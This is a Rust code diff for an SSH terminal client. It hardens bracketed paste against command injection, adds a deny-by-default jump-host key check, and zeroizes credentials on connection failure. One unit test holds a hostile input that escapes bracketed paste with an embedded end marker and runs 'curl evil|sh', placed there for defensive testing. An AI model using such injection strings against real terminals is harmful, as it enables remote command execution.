@@ -696,9 +696,14 @@ pub fn terminal_commit_text_bytes(text: String, bracketed_paste_mode: bool) -> V
     let normalized = text.replace("\r\n", "\r").replace('\n', "\r");
     let code_point_count = normalized.chars().count();
     if code_point_count > 1 && bracketed_paste_mode {
+        // RC-12(2026-09-29 コードレビュー): 本文に`ESC[201~`が含まれていると
+        // bracketed pasteがそこで終わり、残りがシェルにコマンドとして実行されて
+        // しまう(クリップボード経由のコマンド注入)。xterm/kitty等と同様、括る前に
+        // ESCとC1制御文字(8bit CSI等)を取り除く。
+        let sanitized: String = normalized.chars().filter(|&c| c != '\x1b' && !('\u{80}'..='\u{9f}').contains(&c)).collect();
         let mut bytes = Vec::new();
         bytes.extend_from_slice(b"\x1B[200~");
-        bytes.extend_from_slice(normalized.as_bytes());
+        bytes.extend_from_slice(sanitized.as_bytes());
         bytes.extend_from_slice(b"\x1B[201~");
         bytes
     } else {
@@ -1523,6 +1528,13 @@ pub trait OrchestratorCallback: Send + Sync {
 pub(crate) trait SessionCallback: Send + Sync {
     fn on_data(&self, data: Vec<u8>);
     fn on_host_key(&self, fingerprint: String) -> bool;
+    /// RC-07: ProxyJumpの踏み台ホストのホスト鍵確認。`host`/`port`は踏み台自身の識別子
+    /// (接続先targetのものではない)。既定は安全側で拒否する——本番の実装は
+    /// `OrchestratorAdapter`(踏み台の`host:port`でOrchestratorCallback::on_host_keyへ委譲)。
+    fn on_jump_host_key(&self, host: String, port: u16, fingerprint: String) -> bool {
+        let _ = (host, port, fingerprint);
+        false
+    }
     fn on_connected(&self);
     fn on_disconnected(&self, reason: Option<String>);
     fn on_screen_update(&self, update: ScreenUpdate);
@@ -1651,12 +1663,15 @@ pub(crate) async fn run_russh_transport(
 
     let pooled = match &pool_key {
         None => {
-            match transport::establish_ssh_handle(
+            match pool::with_establish_timeout(transport::establish_ssh_handle(
                 &config.jump, russh_config, &config.host, config.port,
                 &config.username, &mut config.auth, config.agent_forward, &event_tx,
-            ).await {
+            )).await {
                 Ok(p) => Arc::new(p),
                 Err(msg) => {
+                    // タイムアウトで確立途中に打ち切られた場合は認証情報のゼロ化が
+                    // まだ済んでいないことがあるので、ここで確実に行う(冪等)。
+                    transport::zeroize_ssh_auth(&mut config.auth);
                     log::warn!("ssh: {msg}");
                     event_tx.send(TransportEvent::Disconnected { reason: Some(msg) }).await.ok();
                     return;
@@ -1681,12 +1696,14 @@ pub(crate) async fn run_russh_transport(
                 }
             }
             pool::AttachOutcome::Establisher => {
-                match transport::establish_ssh_handle(
+                // RC-16: 確立全体に上限を設け、止まっても必ずpublish_failureする。
+                match pool::with_establish_timeout(transport::establish_ssh_handle(
                     &config.jump, russh_config, &config.host, config.port,
                     &config.username, &mut config.auth, config.agent_forward, &event_tx,
-                ).await {
+                )).await {
                     Ok(p) => pool::publish_success(&pool::SSH_POOL, key, p),
                     Err(msg) => {
+                        transport::zeroize_ssh_auth(&mut config.auth);
                         pool::publish_failure(&pool::SSH_POOL, key, msg.clone());
                         pool::release(&pool::SSH_POOL, key.clone(), pool::PLAIN_SSH_IDLE_GRACE);
                         log::warn!("ssh: {msg}");
@@ -2386,6 +2403,17 @@ mod terminal_key_mapping_tests {
     #[test]
     fn crlf_is_normalized_to_single_cr() {
         assert_eq!(terminal_commit_text_bytes("a\r\nb".to_string(), false), "a\rb".as_bytes().to_vec());
+    }
+
+    #[test]
+    fn bracketed_paste_strips_embedded_end_marker_and_escapes() {
+        // RC-12: 本文中の`ESC[201~`でbracketed pasteを抜けてコマンドを注入できないこと。
+        let bytes = terminal_commit_text_bytes("x\x1b[201~curl evil|sh\r".to_string(), true);
+        assert!(bytes.starts_with(b"\x1b[200~"));
+        assert!(bytes.ends_with(b"\x1b[201~"));
+        let inner = &bytes[6..bytes.len() - 6];
+        assert!(!inner.contains(&0x1b), "本文にESCが残ってはいけない");
+        assert_eq!(inner, b"x[201~curl evil|sh\r");
     }
 
     #[test]
